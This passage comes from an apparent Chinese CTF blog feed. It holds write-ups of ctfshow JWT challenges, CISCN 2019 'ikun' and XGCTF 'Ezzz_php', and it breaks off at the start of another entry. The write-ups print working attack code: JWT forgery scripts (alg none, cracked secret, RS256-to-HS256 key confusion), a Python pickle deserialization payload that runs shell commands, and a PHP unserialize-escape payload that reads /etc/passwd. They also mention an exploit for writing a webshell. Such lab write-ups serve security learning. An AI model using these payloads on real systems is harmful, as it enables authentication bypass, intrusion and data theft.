class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=1;<span class="hljs-variable">$k</span>&lt;=sizeof(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = 0;<span class="hljs-variable">$i</span> &lt; 9; <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = 0;<span class="hljs-variable">$j</span> &lt;=9;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-variable">$exp</span> = <span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>] ^ <span class="hljs-variable">$i</span>.<span class="hljs-variable">$j</span>;<br>            <span class="hljs-built_in">echo</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;^$i<span class="hljs-variable">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-variable">$exp</span>&quot;</span>);<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个脚本通过异或可以生成很多的字符，拼接最后就可以得到payload涨知识了</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-jwt</title>
    <link href="/2024/09/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-jwt/"/>
    <url>/2024/09/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-jwt/</url>
    
    <content type="html"><![CDATA[<h1 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h1><h2 id="web345"><a class="markdownIt-Anchor" href="#web345"></a> web345</h2><p>打开查看页面源码提示/admin/，抓包看看有没有东西，发现是jwt，放jwt.io里看一下没有加密方式，那就是简单的base64进行转化，这里利用hackerbar进行发包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;None&quot;</span>,<span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;jwt&quot;</span>&#125;[&#123;<span class="hljs-string">&quot;iss&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;iat&quot;</span>:1725711082,<span class="hljs-string">&quot;exp&quot;</span>:1725718282,<span class="hljs-string">&quot;nbf&quot;</span>:1725711082,<span class="hljs-string">&quot;sub&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;jti&quot;</span>:<span class="hljs-string">&quot;49c32732a51fddf321b60f8bd4e3b3fd&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p>这里把sub的user改成admin，然后再进行base64加密就行，放到原来的地方再发包得到flag</p><h2 id="web346"><a class="markdownIt-Anchor" href="#web346"></a> web346</h2><p>正常流程用jwt.io检测一下，发现是  “alg”: &quot;HS256&quot;加密，JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。这里直接base64看不了，利用网站，自己脚本编一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>headers=&#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br>token_dict=&#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1725711820</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1725719020</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1725711820</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;db9c8eec3e315880838b4b09ee3d8345&quot;</span><br>&#125;<br>jwt_token= jwt.encode(token_dict,<br>                      <span class="hljs-string">&quot;&quot;</span>,<br>                      algorithm=<span class="hljs-string">&quot;none&quot;</span>,<br>                      headers=headers)<br><span class="hljs-built_in">print</span>(jwt_token)<br></code></pre></td></tr></table></figure><p>流程和上一题基本一致</p><h2 id="web347"><a class="markdownIt-Anchor" href="#web347"></a> web347</h2><p>不能直接改了，有弱口令提示，猜测常见的的弱密码，发现结果是123456，改admin，输入弱密码，得到jwt流程基本和前面一致。</p><h2 id="web348"><a class="markdownIt-Anchor" href="#web348"></a> web348</h2><p>这题标题提示的是爆破，需要利用工具是c-jwt-cracker，去github可以搜到工具，爆破一下得到密钥，剩余流程和之前的差不多</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07204503.png" alt="2024-09-07204503"></p><h2 id="web349"><a class="markdownIt-Anchor" href="#web349"></a> web349</h2><p>先上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">/* GET home page. */<br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, function(req, res, <span class="hljs-built_in">next</span>) &#123;<br>  res.<span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  var privateKey = fs.readFileSync(process.cwd()+<span class="hljs-string">&#x27;//public//private.key&#x27;</span>);<br>  var token = jwt.sign(&#123; user: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; algorithm: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br>  res.cookie(<span class="hljs-string">&#x27;auth&#x27;</span>,token);<br>  res.end(<span class="hljs-string">&#x27;where is flag?&#x27;</span>);<br>  <br>&#125;);<br><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>,function(req,res,<span class="hljs-built_in">next</span>)&#123;<br>var flag=<span class="hljs-string">&quot;flag_here&quot;</span>;<br>res.<span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>var auth = req.cookies.auth;<br>var cert = fs.readFileSync(process.cwd()+<span class="hljs-string">&#x27;//public/public.key&#x27;</span>);  // get public key<br>jwt.verify(auth, cert, function(err, decoded) &#123;<br>  <span class="hljs-keyword">if</span>(decoded.user===<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>  res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.end(<span class="hljs-string">&#x27;you are not admin&#x27;</span>);<br>  &#125;<br>&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>这题不一样了，是RS256，可以访问private.key和public.key，会下载密钥和公钥，把公私钥放进去流程也是一样，测试了一下在线网站好像不能直接运行啊，用python写个脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br>private = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;private.key&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>payload = &#123;<br>  <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1725719515</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;RS256&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br>token = jwt.encode(payload=payload,<br>                   key=private,<br>                   algorithm=<span class="hljs-string">&quot;RS256&quot;</span>,<br>                   headers=headers)<br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07224432.png" alt="2024-09-07224432"></p><h2 id="web350"><a class="markdownIt-Anchor" href="#web350"></a> web350</h2><p>和上题大致一样，但是只给了public key,这题需要nodejs跑一下，先上个脚本吧</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">const jwt = require(&#x27;jsonwebtoken&#x27;);<br>var fs = require(&#x27;fs&#x27;);<br><br>var privateKey = fs.readFileSync(&#x27;public.key&#x27;);<br><br>var token = jwt.sign(<span class="hljs-punctuation">&#123;</span> user<span class="hljs-punctuation">:</span> &#x27;admin&#x27; <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> privateKey<span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span> algorithm<span class="hljs-punctuation">:</span> &#x27;HS256&#x27; <span class="hljs-punctuation">&#125;</span>);<br><br>console.log(token);<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07230802.png" alt="2024-09-07230802"></p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-07230754.png" alt="2024-09-07230754"></p><h1 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点</h1><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><p>jwt(JSON Web Token)是一串json格式的字符串，由服务端用加密算法对信息签名来保证其完整性和不可伪造。Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息，JWT可用于身份认证、会话状态维持、信息交换等。它的出现是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://link.zhihu.com/?target=https%3A//link.jianshu.com/%3Ft%3Dhttps%3A//tools.ietf.org/html/rfc7519">(RFC 7519</a>).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。</p><p>一个jwt token 由三部分组成，header,payload和signature,以点隔开，类似于<code>orange.apple.banana</code>这个样子</p><ul><li>header用来声明token的类型和签名用的算法等，需要经过base64Url编码，比如</li></ul><p><code>&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</code></p><p>alg表示的是签名的算法，默认是HMAC SHA256(写成HS256)</p><p>typ表示这个令牌的类型，统一写作JWT</p><ul><li>payload用来表示真正的token信息，也需要base64Url编码，比如</li></ul><p><code>&#123;&quot;sub&quot;:&quot;1234567890&quot;,&quot;name&quot;:&quot;orange&quot;,&quot;iat&quot;:1516239022&#125;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">JWT 规定了7个官方字段，供选用<br>iss (issuer)：签发人<br>exp (expiration time)：过期时间<br>sub (subject)：主题<br>aud (audience)：受众<br>nbf (Not Before)：生效时间<br>iat (Issued At)：签发时间<br>jti (JWT ID)：编号<br></code></pre></td></tr></table></figure><ul><li>signature，将前两部分用<code>alg</code>指定的算法加密，再经过Base64Url编码就是signature了，作用是防止数据篡改。</li></ul><h2 id="解码"><a class="markdownIt-Anchor" href="#解码"></a> 解码</h2><p>正常使用<a href="https://jwt.io/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E8%A7%82%E7%9A%84%E4%BA%86%E8%A7%A3header%E5%92%8Cpayload">https://jwt.io/这个网站，可以直观的了解header和payload</a></p><p>爆破secret.key工具<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p><p>我使用的是docker起的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack jwt内容<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jwt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019ciscn-ikun</title>
    <link href="/2024/09/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2019ciscn-ikun/"/>
    <url>/2024/09/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2019ciscn-ikun/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p><a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun">在线靶场</a></p><p>一个生成的网站，有提示需要买到Lv6，然后就没有然后了</p><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><p>下面有很多Lv2-Lv5的，可以尝试写个脚本找到网页</p><p>点击图片看名称，<code>src=&quot;/static/img/lv/lv3.png&quot;</code>写脚本爆一下看看哪页有lv6.png的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://c66eb3e7-b146-49bb-b9c7-e58d5fef7173.node5.buuoj.cn:81/shop?page=&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">300</span>):<br>    response = requests.get(url+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;lv6.png&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>可以在181页找到内容，这里先常规注册一个账号，给了10price</p><img src="/../../images/每日一题/2024-09-04155642.png" alt="2024-09-04155642" style="zoom:50%;"><p>很明显需要尝试改一下内容，购买的时候抓包一下，把discount改的很小就行</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04160139.png" alt="2024-09-04160139"></p><p>然后应该考察的内容是cookie的内容，发现有jwt,用jwt网站看一下内容，修改成admin需要有密钥，用工具可以跑一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/brendan-rius/c-jwt-cracker.git<br></code></pre></td></tr></table></figure><p>然后根据github上面的要求docker一下就行了，得到了密钥进行修改，将新的jwt修改发包刷新，看到一个压缩包，解压在Admin.py里发现了pickle的moudle,注意到有pickle的利用，在这边进行突破，最后得到flag</p><h2 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h2><p>用分析的脚本搜索，进入?page=181,然后点击购买就行抓包，利用jwt修改admin，需要爆破密钥</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04161841.png" alt="2024-09-04161841"></p><p>得到密钥是1Kun，随后修改得到可用的jwt</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04165203.png" alt="2024-09-04165203"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo<br></code></pre></td></tr></table></figure><p>修改成为admin,看网页的源码得到下载的<code>www.zip</code>定位到Admin.py里面的pickle,找到关键代码</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04162728.png" alt="2024-09-04162728"></p><p>尝试写利用脚本，这里需要注意的是用python2的环境，而且os.system并不会成功打通，可以使用commands进行利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br>orange = exp()<br><br><span class="hljs-built_in">print</span>(urllib.quote(pickle.dumps(orange)))<br></code></pre></td></tr></table></figure><p>先ls找到了flag.txt，然后cat /flag.txt，就可以得到flag了</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04164924.png" alt="2024-09-04164924"></p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jwt</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XGCTF-Ezzz_php</title>
    <link href="/2024/09/03/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/XGCTF-Ezzz_php/"/>
    <url>/2024/09/03/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/XGCTF-Ezzz_php/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p><a href="https://ctf.show/challenges#Ezzz_php-4404">在线靶场</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">read_file</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/etc/passwd&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;start=<span class="hljs-variable">$start</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;start == <span class="hljs-string">&quot;gxngxngxn&quot;</span>)&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;What you are reading is:&#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;start&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$readfile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">read_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;start&#x27;</span>]);<br>    <span class="hljs-variable">$read</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]:<span class="hljs-string">&quot;I_want_to_Read_flag&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$readfile</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ctf</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Start_Funny_CTF!!!&quot;</span>;<br>&#125; Start_Funny_CTF!!!<br></code></pre></td></tr></table></figure><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><p>利用这个函数进行读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;start == <span class="hljs-string">&quot;gxngxngxn&quot;</span>)&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;What you are reading is:&#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>需要进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$readfile</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ctf</span>);<br></code></pre></td></tr></table></figure><p>先简单的测试一下在上部分构造序列化的样子</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-03162619.png" alt="2024-09-03162619"></p><p>传入gxngxngxn，长度为82。</p><p>接下来尝试利用file_get_contents，最常见的就是利用伪协议进行读取<code>php://filter/convert.base64-encode/resource=/etc/passwd</code></p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-03163445.png" alt="2024-09-03163445"></p><p>然后需要进行截取，详细的请看我nepctf的解析，简单的来说就是进行逃逸，利用%f0和%9f进行逃逸</p><p>需要逃逸的内容是<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;</code>,就是相当于覆盖前面的内容，用自己的链</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-03165332.png" alt="2024-09-03165332"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">read</span>=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f<br></code></pre></td></tr></table></figure><p>我对这个的理解就是增三减一，这题是38，构造13个%f0abc和1个%9f就可以达到覆盖的作用</p><p>通常到这一步应该就结束了，但是并不知道flag的文件名，还是需要命令执行，回收世界线。</p><p>官p给出的是考察了<a href="https://xz.aliyun.com/t/14690?time__1311=mqmx9QDtDQ0=ex0y34+g6YG8bou8xGIxx">CVE-2024-2961</a>,具体内容我们先按下不表，利用exp先打通一下。</p><p>这里借用的晨曦师傅的脚本，可以去了解一下，脚本需要微调一下，官方的也可以。</p><h2 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h2><p>其实环境弄了几个小时，一直有问题报错，基本的原理我已经懂了，先上payload吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">read</span>=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f&amp;start=O:9:<span class="hljs-string">&quot;read_file&quot;</span>:2:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:9:<span class="hljs-string">&quot;gxngxngxn&quot;</span>;s:8:<span class="hljs-string">&quot;filename&quot;</span>;s:55:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>;&#125;                              <br></code></pre></td></tr></table></figure><p>然后利用exp打通写马进去，这里注意环境要在3.10以上，尽量在linux环境，弄了半天没有完成orz，但是基本原理还是懂了的。</p><p>另起：昨天写完后回去突然就明白了,只需要把https改为http就可以成功了</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04153017.png" alt="2024-09-04153017"></p><p>然后读取flag</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04152836.png" alt="2024-09-04152836"></p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>serialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023ciscn-Unzip</title>
    <link href="/2024/09/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2023ciscn-Unzip/"/>
    <url>/2024/09/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2023ciscn-Unzip/</url>
    
